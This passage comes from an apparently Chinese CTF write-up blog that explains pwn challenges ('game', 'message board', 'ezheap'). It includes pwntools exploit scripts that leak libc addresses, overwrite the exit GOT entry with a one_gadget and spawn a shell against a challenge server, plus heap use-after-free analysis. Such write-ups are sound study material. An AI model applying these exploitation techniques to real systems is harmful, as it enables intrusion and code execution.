punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input content\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input idx\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"game\"><a class=\"markdownIt-Anchor\" href=\"#game\">#</a> game</h2>\n<p>NULL_byte_off-by-one in stack, libc 偏移</p>\n<p>或许这道题属于 re？而且这道题含 utf-8 字符，写脚本还不好写。</p>\n<h3 id=\"程序流程\"><a class=\"markdownIt-Anchor\" href=\"#程序流程\">#</a> 程序流程</h3>\n<p>程序大致流程如下：</p>\n<ul>\n<li>先选择角色，选择三月七或派蒙。</li>\n<li>然后进入主循环。主循环中，可以选择送原石（接委托）或者送 kfc 联名套餐（对肯德基爷爷说话）。其中，原神玩家只能接委托，崩铁玩家只能对肯德基爷爷说话，否则都会直接退出。</li>\n<li>接委托中，会让 v7 增加 0x10000（起始为 0）。其次，如果 v7 大于 0x3ffff，即执行了 4 次以上委托，就会泄露 system 函数的地址。</li>\n<li>对话中，使用 read 函数向栈上输入值。这里存在漏洞，如果没有输入回车作为结尾，会自动在字符串最后添加 <code>'\\0'</code> ，在输入 8 个非回车字节后直接覆盖第 9 字节，可以修改相邻的变量。而该变量标识了玩家选择的角色，1 为三月七，0 为派蒙。覆盖为 0 后，可以从对话转为接委托。</li>\n</ul>\n<p><img data-src=\"./image-20231019173000077.png\" alt=\"image-20231019173000077\"></p>\n<h3 id=\"漏洞\"><a class=\"markdownIt-Anchor\" href=\"#漏洞\">#</a> 漏洞</h3>\n<p>在主函数最后，会执行 <code>&amp;puts-v3-v7</code>  处的函数，以 v5 作为变量。因此调整对应函数地址为 system 的地址，让 v5 指向 <code>&quot;/bin/sh\\0&quot;</code> ，即可实现 getshell。</p>\n<p>其中，进入该分支的前提是，主菜单选择时输入 3，并且执行过接委托和对话。而利用 read 函数处的漏洞即可实现。v7 的值即执行委托时累加的值，v3 的值当场输入，但只能输入 short 类型，即只能输入范围在 - 32768~32767 的值。</p>\n<p><img data-src=\"./image-20231019173843622.png\" alt=\"image-20231019173843622\"></p>\n<h4 id=\"计算偏移\"><a class=\"markdownIt-Anchor\" href=\"#计算偏移\">#</a> 计算偏移</h4>\n<p>首先计算 puts 函数和 system 函数的偏移。这个利用题目所给的 libc.so.6 文件即可直接算出，不需要先泄露再去计算，因为这边只需要偏移不需要绝对地址。所以接委托中泄露 system 地址的功能可有可无。利用 pwintools 算一算。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"puts: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>puts_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, system: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#bs_a = libcbase + next(libc.search(b'/bin/sh'))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>offset <span class=\"token operator\">=</span> puts_a <span class=\"token operator\">-</span> sys_a</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"offset: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>offset<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    v3 <span class=\"token operator\">=</span> offset <span class=\"token operator\">-</span> i<span class=\"token operator\">*</span><span class=\"token number\">0x10000</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">: v3=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>v3<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231019174341968.png\" alt=\"image-20231019174341968\"></p>\n<p>两者偏移为 205200，只有在 v7 为 0x30000 时，v3 才能控制在 short 范围内，即 8592。</p>\n<p>v5 的值即为与肯德基老爷爷对话的内容，所以对话时输入 <code>&quot;/bin//sh&quot;</code> ，刚好 8 字节。</p>\n<blockquote>\n<p>懒得写脚本实现了，不然我更喜欢 /bin/sh\\0</p>\n</blockquote>\n<p><img data-src=\"./image-20231019174720038.png\" alt=\"image-20231019174720038\"></p>\n<h2 id=\"message-board\"><a class=\"markdownIt-Anchor\" href=\"#message-board\">#</a> message board</h2>\n<p>scanf 漏洞，got 劫持</p>\n<p>主函数中，存在任意地址写入，但首先会经过 board 函数。</p>\n<p>在 board 函数中，可以自定义选择往栈上利用 scanf 输入最多 15 个字节。接着，会要求输入 puts 的真实地址，输入错误直接结束程序。</p>\n<h3 id=\"泄露地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露地址\">#</a> 泄露地址</h3>\n<p>scanf 函数可以利用非数字字符跳过输入，而这样的操作不会改变对应地址原本的值。但是如果输入大部分非数字字符，scanf 读取后跳过，但不会将该字符从缓冲区中拿走，因此，该程序后续的所有 scanf 都会直接跳过，包括要求输入 puts 地址的。但是，如果输入的是 <code>'+'</code> ，那么只会忽略当前的 <code>&quot;%d&quot;</code> ，应该是因为 + 作为正负号吧。</p>\n<p>跳过大量 scanf，我们可以拿到很多栈上数据。</p>\n<p><img data-src=\"./image-20231019180236594.png\" alt=\"image-20231019180236594\" style=\"zoom:50%;\" /><img data-src=\"./image-20231019180408010.png\" alt=\"image-20231019180408010\"></p>\n<p>其中，可以通过黄色的地址推算栈上地址。可以通过紫色地址推算 libc 基址。</p>\n<p>利用 <code>_IO_2_1_stdeer_</code> 推算 libc 基地址，然后查库算出 puts 真实地址并输入，即可进入主函数。</p>\n<p>在主函数中，由于没有对下标进行检测，所以我们拥有两次修改任意地址 4 字节的机会。但由于输入均为输入 32 位整数，且 a 数组处于.bss 段，所以够不到 libc 处或者栈空间，但是可以够到 got 表，且只开了 Partial RELRO 保护，got 可写。<img data-src=\"./image-20231019181238330.png\" alt=\"image-20231019181238330\" style=\"zoom:67%;\" /></p>\n<p>在主函数最后执行了 <code>exit(0)</code> ，因此我们可以将 got 表中 exit 的值修改为 one_gadget，便可以直接执行 getshell。</p>\n<h3 id=\"计算下标\"><a class=\"markdownIt-Anchor\" href=\"#计算下标\">#</a> 计算下标</h3>\n<p>a 数组的地址为 0x4040A0，而 got 表 exit 项的地址为 0x404030，因此偏移为 <code>offset=0x404030-0x4040A0=-0x70</code> ，下标应为 <code>idx=offset/4=-0x70/0x4=-0x1c=-28</code> 。而 one_gadget 长度超过 4 字节，应分两次写入，刚好用完两次机会。第一次往 <code>idx=-28</code>  处写入地址低 4 位字节 <code>onegadget&amp;0xffffffff</code> ，第二次往 <code>idx+1=-27</code>  处写入高 4 位字节 <code>onegadget&gt;&gt;32</code> 。</p>\n<h3 id=\"one_gadget获取\"><a class=\"markdownIt-Anchor\" href=\"#one_gadget获取\">#</a> one_gadget 获取</h3>\n<p>利用 one_gadget 工具。获取了该 libc 版本的 3 个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182348766.png\" alt=\"image-20231019182348766\"></p>\n<p>在程序运行到最后 exit 时，rdi 和 rsi 寄存器值为 0，可以使用第三个 one_gadget。</p>\n<p><img data-src=\"./image-20231019182306437.png\" alt=\"image-20231019182306437\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn_pe')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28040</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b *0x401336')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset </pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#p.send(payload)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'15'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>strerr <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>stack1 <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'is '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        strerr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token number\">12</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        stack1 <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"strerr:%#x, stack:%#x\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>strerr<span class=\"token punctuation\">,</span>stack1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.31.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libcbase <span class=\"token operator\">=</span> strerr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stderr_'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#if offine, libcbase need add 0x30</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>puts_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#rtld = libcbase + libc.sym['_rtld_global']</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rtld <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0x222030</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token number\">0xe3b01</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>exit_hook <span class=\"token operator\">=</span> rtld <span class=\"token operator\">+</span> <span class=\"token number\">3848</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>exit_g <span class=\"token operator\">=</span> <span class=\"token number\">0x404030</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">0x4040A0</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>exit_g<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Now please enter the verification code\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>puts_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rtld-libc %#x\"</span><span class=\"token operator\">%</span>libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_rtld_global'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libcbase %#x\"</span><span class=\"token operator\">%</span>libcbase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"rtld: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>rtld<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, exithook: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>exit_hook<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">, sys_a: </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>sys_a<span class=\"token punctuation\">:</span><span class=\"token format-spec\">#x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>exit_hook<span class=\"token operator\">-</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">assert</span> index <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x7fffffff</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'You can modify your suggestions\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input new suggestion\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token operator\">>></span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>原本想过去修改_rtld_global 中的 exit_hook，但是后面发现够不着，而且明明可以直接改 exit 的。</p>\n</blockquote>\n<h2 id=\"ezheap\"><a class=\"markdownIt-Anchor\" href=\"#ezheap\">#</a> ezheap</h2>\n<p>堆 heap, chunk_extend_and_overlapping, use_after_free, free_hook, one_gadget</p>\n<p>libc: 2.31</p>\n<h3 id=\"程序分析\"><a class=\"markdownIt-Anchor\" href=\"#程序分析\">#</a> 程序分析</h3>\n<p>程序中功能选择有创建 <code>add()</code> ，释放 <code>delete()</code> ，显示 <code>show()</code> ，编辑 <code>edit()</code> 。</p>\n<h4 id=\"add函数\"><a class=\"markdownIt-Anchor\" href=\"#add函数\">#</a> add 函数</h4>\n<p>总共可以分配 15 个 chunk，不能覆盖已有 chunk 的地址，且由于释放 chunk 时不清空指针，所以共可以分配 15 次 chunk。</p>\n<p>每次分配中，先分配固定的 0x20 的空间（实际占用 0x30），这里称为 head chunk，其地址放在 notebook 数组中。然后再分配一个对应输入大小的块，称为 real chunk，其大小会储存在 notesize 数组。headchunk 会储存 real chunk 的大小，以及储存 real chunk 的地址 (headchunk+0x18)。</p>\n<h4 id=\"delete函数\"><a class=\"markdownIt-Anchor\" href=\"#delete函数\">#</a> delete 函数</h4>\n<p>这个 delete 函数是个有缺陷的函数。它只会 free 掉对应的 head chunk，而 real chunk 完全不 free 的。也就是只会 free 掉储存在 notebook 数组的地址对应的 chunk。</p>\n<h4 id=\"show函数\"><a class=\"markdownIt-Anchor\" href=\"#show函数\">#</a> show 函数</h4>\n<p>输出 real chunk 的值，也就是先读取 notebook 对应的 head chunk，然后输出 head chunk 中的第 24 个字节开始的地址对应的内容。</p>\n<h4 id=\"edit函数\"><a class=\"markdownIt-Anchor\" href=\"#edit函数\">#</a> edit 函数</h4>\n<p>编辑函数，但是存在检查。</p>\n<p>会检查 head chunk 的储存的 size 与 notesize 储存的是否一致。如果一致，可直接向 head chunk 储存的地址写入内容。</p>\n<h3 id=\"漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h3>\n<h4 id=\"任意地址读写\"><a class=\"markdownIt-Anchor\" href=\"#任意地址读写\">#</a> 任意地址读写</h4>\n<p>经典的带有 head chunk 的题。释放两个 headchunk，这时如果请求一个与 headchunk 大小一致的 realchunk，那么 realchunk 会分配到其中一个已经释放的 headchunk 处。这样我们就有办法 free 掉 real chunk 了。</p>\n<p>后续按在堆中出现顺序称呼 headchunk 和 realchunk，如 head0, head1, real0, real1</p>\n<p><img data-src=\"./1.png\" alt=\"1\"></p>\n<p>其次，这样操作后，head0 指向 head2，因此便可以利用 ehad0 修改 head1 的值，保留 size 值不变，修改地址为目标地址，这样就可以利用 head1 配合 edit 函数实现任意地址读写。可以修改如 <code>__free_hook</code>  的值，将其修改为 one_gadget 然后执行 free (0) 实现 getshell。</p>\n<p>这时 head1 还残留着指向 real1 的值，只要将前 0x18 个字节填充了，即可将其泄露。</p>\n<h4 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h4>\n<p>要实现这个目的需要泄露 libc 地址，然后才能计算 <code>__free_hook</code>  和 one_gadget 的地址。而泄露 libc 的方法则是 free 掉一个较大的 chunk，该 chunk 会被放入 unsorted bin，其 fd 和 bk 即为 mainarena+96 的值，可以利用其计算 libc 的基址。利用 UAF 读取该地址。tcache 的大小最大为 0x410，因此释放的 